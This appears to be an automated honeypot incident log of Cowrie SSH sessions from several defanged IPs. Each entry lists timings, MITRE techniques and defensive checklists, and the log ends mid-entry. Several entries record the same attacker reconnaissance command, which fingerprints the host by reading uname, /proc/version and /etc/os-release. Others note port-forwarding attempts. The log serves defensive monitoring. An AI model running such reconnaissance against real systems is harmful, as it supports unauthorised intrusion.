### 🔴 HIGH · IR-20c07e26cb36

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 16:01 |
| **Last Seen** | 2026-07-04 16:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:01:47` | `cowrie.session.connect` |
| `2026-07-04 16:01:47` | `cowrie.client.version` |
| `2026-07-04 16:01:47` | `cowrie.client.kex` |
| `2026-07-04 16:01:48` | `cowrie.login.success` |
| `2026-07-04 16:01:50` | `cowrie.session.params` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.success` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.command.input` |
| `2026-07-04 16:01:50` | `cowrie.log.closed` |
| `2026-07-04 16:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3d82f61edf7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 16:02 |
| **Last Seen** | 2026-07-04 16:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:02:27` | `cowrie.session.connect` |
| `2026-07-04 16:02:27` | `cowrie.client.version` |
| `2026-07-04 16:02:27` | `cowrie.client.kex` |
| `2026-07-04 16:02:27` | `cowrie.login.success` |
| `2026-07-04 16:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb66948bea7f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 16:02 |
| **Last Seen** | 2026-07-04 16:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:02:27` | `cowrie.session.connect` |
| `2026-07-04 16:02:27` | `cowrie.client.version` |
| `2026-07-04 16:02:27` | `cowrie.client.kex` |
| `2026-07-04 16:02:28` | `cowrie.login.success` |
| `2026-07-04 16:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1ec9be47cd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:02 |
| **Last Seen** | 2026-07-04 16:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:02:40` | `cowrie.session.connect` |
| `2026-07-04 16:02:40` | `cowrie.client.version` |
| `2026-07-04 16:02:40` | `cowrie.client.kex` |
| `2026-07-04 16:02:40` | `cowrie.login.success` |
| `2026-07-04 16:02:40` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:02:40` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04427abf78aa

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:06 |
| **Last Seen** | 2026-07-04 16:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:06:08` | `cowrie.session.connect` |
| `2026-07-04 16:06:08` | `cowrie.client.version` |
| `2026-07-04 16:06:09` | `cowrie.client.kex` |
| `2026-07-04 16:06:09` | `cowrie.login.success` |
| `2026-07-04 16:06:09` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:06:09` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f769cba52a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 16:06 |
| **Last Seen** | 2026-07-04 16:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:06:29` | `cowrie.session.connect` |
| `2026-07-04 16:06:29` | `cowrie.client.version` |
| `2026-07-04 16:06:29` | `cowrie.client.kex` |
| `2026-07-04 16:06:30` | `cowrie.login.success` |
| `2026-07-04 16:06:30` | `cowrie.session.params` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.success` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:30` | `cowrie.command.input` |
| `2026-07-04 16:06:31` | `cowrie.log.closed` |
| `2026-07-04 16:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7ad3ad1a3d6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 16:08 |
| **Last Seen** | 2026-07-04 16:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:08:53` | `cowrie.session.connect` |
| `2026-07-04 16:08:53` | `cowrie.client.version` |
| `2026-07-04 16:08:53` | `cowrie.client.kex` |
| `2026-07-04 16:08:54` | `cowrie.login.success` |
| `2026-07-04 16:08:55` | `cowrie.session.params` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.success` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.command.input` |
| `2026-07-04 16:08:55` | `cowrie.log.closed` |
| `2026-07-04 16:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ea01455857

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:09 |
| **Last Seen** | 2026-07-04 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:09:22` | `cowrie.session.connect` |
| `2026-07-04 16:09:22` | `cowrie.client.version` |
| `2026-07-04 16:09:22` | `cowrie.client.kex` |
| `2026-07-04 16:09:22` | `cowrie.login.success` |
| `2026-07-04 16:09:23` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:09:23` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e875b97bee2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 16:11 |
| **Last Seen** | 2026-07-04 16:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:11:30` | `cowrie.session.connect` |
| `2026-07-04 16:11:30` | `cowrie.client.version` |
| `2026-07-04 16:11:30` | `cowrie.client.kex` |
| `2026-07-04 16:11:31` | `cowrie.login.success` |
| `2026-07-04 16:11:32` | `cowrie.session.params` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.success` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.command.input` |
| `2026-07-04 16:11:32` | `cowrie.log.closed` |
| `2026-07-04 16:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a02f0cea76

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:12 |
| **Last Seen** | 2026-07-04 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:12:30` | `cowrie.session.connect` |
| `2026-07-04 16:12:30` | `cowrie.client.version` |
| `2026-07-04 16:12:30` | `cowrie.client.kex` |
| `2026-07-04 16:12:30` | `cowrie.login.success` |
| `2026-07-04 16:12:30` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:12:30` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40622641cba3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 16:12 |
| **Last Seen** | 2026-07-04 16:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:12:54` | `cowrie.session.connect` |
| `2026-07-04 16:12:56` | `cowrie.client.version` |
| `2026-07-04 16:12:56` | `cowrie.client.kex` |
| `2026-07-04 16:13:02` | `cowrie.login.success` |
| `2026-07-04 16:13:05` | `cowrie.session.params` |
| `2026-07-04 16:13:05` | `cowrie.command.input` |
| `2026-07-04 16:13:07` | `cowrie.log.closed` |
| `2026-07-04 16:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d191ff72964b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 16:14 |
| **Last Seen** | 2026-07-04 16:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:14:20` | `cowrie.session.connect` |
| `2026-07-04 16:14:20` | `cowrie.client.version` |
| `2026-07-04 16:14:20` | `cowrie.client.kex` |
| `2026-07-04 16:14:21` | `cowrie.login.success` |
| `2026-07-04 16:14:22` | `cowrie.session.params` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.success` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.command.input` |
| `2026-07-04 16:14:22` | `cowrie.log.closed` |
| `2026-07-04 16:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314572823935

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:15 |
| **Last Seen** | 2026-07-04 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:15:35` | `cowrie.session.connect` |
| `2026-07-04 16:15:35` | `cowrie.client.version` |
| `2026-07-04 16:15:35` | `cowrie.client.kex` |
| `2026-07-04 16:15:36` | `cowrie.login.success` |
| `2026-07-04 16:15:36` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:15:36` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f1e7232e08e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 16:17 |
| **Last Seen** | 2026-07-04 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:17:27` | `cowrie.session.connect` |
| `2026-07-04 16:17:27` | `cowrie.client.version` |
| `2026-07-04 16:17:28` | `cowrie.client.kex` |
| `2026-07-04 16:17:28` | `cowrie.login.success` |
| `2026-07-04 16:17:29` | `cowrie.session.params` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.success` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.command.input` |
| `2026-07-04 16:17:29` | `cowrie.log.closed` |
| `2026-07-04 16:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df49b73e2f0

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 16:18 |
| **Last Seen** | 2026-07-04 16:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:18:14` | `cowrie.session.connect` |
| `2026-07-04 16:18:14` | `cowrie.client.version` |
| `2026-07-04 16:18:14` | `cowrie.client.kex` |
| `2026-07-04 16:18:14` | `cowrie.login.success` |
| `2026-07-04 16:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cff83d0c6d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 16:18 |
| **Last Seen** | 2026-07-04 16:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:18:14` | `cowrie.session.connect` |
| `2026-07-04 16:18:14` | `cowrie.client.version` |
| `2026-07-04 16:18:14` | `cowrie.client.kex` |
| `2026-07-04 16:18:15` | `cowrie.login.success` |
| `2026-07-04 16:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb9604b305e2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 16:18 |
| **Last Seen** | 2026-07-04 16:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:18:22` | `cowrie.session.connect` |
| `2026-07-04 16:18:22` | `cowrie.client.version` |
| `2026-07-04 16:18:22` | `cowrie.client.kex` |
| `2026-07-04 16:18:22` | `cowrie.login.success` |
| `2026-07-04 16:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb2fb55ee1b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-04 16:18 |
| **Last Seen** | 2026-07-04 16:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:18:23` | `cowrie.session.connect` |
| `2026-07-04 16:18:23` | `cowrie.client.version` |
| `2026-07-04 16:18:23` | `cowrie.client.kex` |
| `2026-07-04 16:18:23` | `cowrie.login.success` |
| `2026-07-04 16:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fef6e264637

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:20 |
| **Last Seen** | 2026-07-04 16:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:20:10` | `cowrie.session.connect` |
| `2026-07-04 16:20:10` | `cowrie.client.version` |
| `2026-07-04 16:20:10` | `cowrie.client.kex` |
| `2026-07-04 16:20:11` | `cowrie.login.success` |
| `2026-07-04 16:20:11` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:20:11` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1754f355f72c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 16:20 |
| **Last Seen** | 2026-07-04 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

